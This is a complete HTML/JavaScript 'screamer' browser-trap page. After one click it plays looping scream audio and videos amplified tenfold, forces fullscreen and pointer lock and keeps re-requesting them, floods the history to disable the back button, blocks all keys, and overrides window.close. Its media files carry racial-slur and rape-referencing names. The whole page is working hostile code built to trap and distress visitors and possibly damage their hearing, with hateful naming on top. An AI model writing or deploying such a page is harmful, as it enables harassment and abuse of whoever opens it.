<!DOCTYPE html>
<html>
<head>

<link rel="stylesheet" type="text/css" href="styles.css">

<meta http-equiv="Cache-Control" content="no-cache, no-store, must-validate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

<style>
* { 
    padding: 0; 
    margin: 0; 
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
}

body, html {
    overflow: hidden;
    height: 100%;
    width: 100%;
    background: #000;
    cursor: none;
}

.video-container {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 1280px;
    height: 480px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    z-index: 1000;
}

.video-wrapper {
    width: 640px;
    height: 480px;
    position: relative;
}

#fart, #ronnie {
    width: 100%;
    height: 100%;
    object-fit: contain;
    position: absolute;
    top: 0;
}

#fart { left: 0; }
#ronnie { right: 0; }

.video-divider {
    width: 2px;
    height: 480px;
    background: red;
    position: absolute;
    left: 50%;
    transform: translateX(-50%);
}

.click-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 9999999;
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
}

.click-overlay button {
    padding: 20px 40px;
    font-size: 20px;
    background: #fff;
    color: #000;
    border: none;
    border-radius: 0;
    cursor: pointer;
}

.black-screen {
    background-color: black;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 9999998;
}

.backg {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 1;
}

.backg img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    opacity: 0.3;
}
</style>
</head>
<body>

<!-- Click anywhere on overlay to start (button is just visual) -->
<div class="click-overlay" id="startOverlay">
    <button>ENTER</button>
</div>
<div class="black-screen"></div>

<audio id="shart" preload="auto" loop src="scream.mp3"></audio>
<audio id="shart2" preload="auto" loop src="scream.mp3"></audio>
<audio id="shart3" preload="auto" loop src="rape.mp3"></audio>

<div class="video-container">
    <div class="video-wrapper">
        <video id="fart" loop src="zzart.mp4" playsinline></video>
    </div>
    <div class="video-divider"></div>
    <div class="video-wrapper">
        <video id="ronnie" loop src="ronnie.mp4" playsinline></video>
    </div>
</div>

<div class="backg"><img src="naggars.gif"></div>

<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
<script>
(function() {
    let hasTriggered = false;
    const ORIGINAL_WIDTH = 640;
    const ORIGINAL_HEIGHT = 480;

    // --- AUDIO BOOST (Web Audio API) ---
    let audioContext;
    let gainNode;
    const mediaElements = [];

    function initAudioBoost() {
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
        gainNode = audioContext.createGain();
        gainNode.gain.value = 10; // 10x volume (maximum loudness, may distort)
        gainNode.connect(audioContext.destination);

        // Connect all audio elements
        const audioIds = ['shart', 'shart2', 'shart3'];
        audioIds.forEach(id => {
            const el = document.getElementById(id);
            if (el) {
                mediaElements.push(el);
                const source = audioContext.createMediaElementSource(el);
                source.connect(gainNode);
                el.loop = true;
                el.muted = false;
            }
        });

        // Connect video elements if they have audio tracks
        const videoIds = ['fart', 'ronnie'];
        videoIds.forEach(id => {
            const el = document.getElementById(id);
            if (el) {
                mediaElements.push(el);
                const source = audioContext.createMediaElementSource(el);
                source.connect(gainNode);
                el.loop = true;
                el.muted = false;
            }
        });
    }

    function playAllMedia() {
        if (audioContext && audioContext.state === 'suspended') {
            audioContext.resume();
        }
        mediaElements.forEach(m => {
            if (m) {
                m.volume = 1.0; // fallback
                m.muted = false;
                const playPromise = m.play();
                if (playPromise !== undefined) {
                    playPromise.catch(() => {
                        // Retry forever
                        setInterval(() => m.play(), 100);
                    });
                }
            }
        });
    }

    // --- FULLSCREEN LOCK (aggressive) ---
    function attemptFullscreen() {
        const elem = document.documentElement;
        if (elem.requestFullscreen) elem.requestFullscreen();
        else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
        else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
        else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
    }

    // --- POINTER LOCK (trap mouse) ---
    function lockPointer() {
        if (document.body.requestPointerLock) {
            document.body.requestPointerLock();
        }
    }

    // --- HISTORY FLOOD (disable back) ---
    function floodHistory() {
        for (let i = 0; i < 20; i++) {
            history.pushState(null, null, location.href);
        }
    }

    // --- KEY BLOCKING (prevent all escape shortcuts) ---
    function blockKeys(e) {
        // Block ALL key combinations â€” user cannot press anything
        e.preventDefault();
        e.stopPropagation();
        return false;
    }

    // --- RE-ENGAGE LOCKS on any user activity ---
    function reengageLocks() {
        if (hasTriggered) {
            // If not in fullscreen, request it
            if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement && !document.msFullscreenElement) {
                attemptFullscreen();
            }
            // If pointer not locked, lock it
            if (!document.pointerLockElement) {
                lockPointer();
            }
        }
    }

    // --- START FUNCTION (called when overlay clicked) ---
    window.startExperience = function() {
        if (hasTriggered) return;
        hasTriggered = true;

        // Hide overlay and black screen
        const overlay = document.getElementById('startOverlay');
        const blackScreen = document.querySelector('.black-screen');
        if (overlay) overlay.style.display = 'none';
        if (blackScreen) blackScreen.style.display = 'none';

        // Flood history
        floodHistory();

        // Initialize audio boost (requires user gesture)
        initAudioBoost();

        // Play all media
        playAllMedia();

        // Initial locks
        attemptFullscreen();
        lockPointer();

        // Set up periodic re-engagement (every 200ms)
        setInterval(reengageLocks, 200);

        // Also re-engage on any user interaction (mouse move, click, key, touch)
        const events = ['mousemove', 'click', 'keydown', 'touchstart', 'mousedown'];
        events.forEach(eventType => {
            document.addEventListener(eventType, reengageLocks, true);
        });

        // Additional fullscreen change detection
        document.addEventListener('fullscreenchange', reengageLocks);
        document.addEventListener('webkitfullscreenchange', reengageLocks);
        document.addEventListener('mozfullscreenchange', reengageLocks);
        document.addEventListener('MSFullscreenChange', reengageLocks);

        // Pointer lock change detection
        document.addEventListener('pointerlockchange', reengageLocks);
        document.addEventListener('mozpointerlockchange', reengageLocks);
        document.addEventListener('webkitpointerlockchange', reengageLocks);

        // Block all keys permanently (after start)
        document.addEventListener('keydown', blockKeys, true);
        document.addEventListener('keyup', blockKeys, true);
        document.addEventListener('keypress', blockKeys, true);
    };

    // --- Attach start to overlay click (anywhere on overlay) ---
    document.getElementById('startOverlay').addEventListener('click', startExperience);

    // --- Initial passive blocks (before start) ---
    document.addEventListener('contextmenu', e => e.preventDefault(), true);
    document.addEventListener('dragstart', e => e.preventDefault(), true);
    document.addEventListener('selectstart', e => e.preventDefault(), true);

    // --- Window close confirmation ---
    window.onbeforeunload = function() {
        return "Are you absolutely sure you want to leave?";
    };

    // --- Override window.close (just in case) ---
    window.close = function() {
        console.warn('Nice try.');
    };

    // --- History popstate trap ---
    window.onpopstate = function() {
        if (hasTriggered) {
            floodHistory();
            reengageLocks();
        }
    };

    // --- Resize logic (unchanged) ---
    function resizeVideos() {
        const videoContainer = document.querySelector('.video-container');
        if (videoContainer) {
            videoContainer.style.width = (ORIGINAL_WIDTH * 2 + 20) + 'px';
            videoContainer.style.height = ORIGINAL_HEIGHT + 'px';
        }
    }

    window.addEventListener('load', () => {
        resizeVideos();
        setInterval(resizeVideos, 2000);
    });

})();
</script>
</body>
</html>
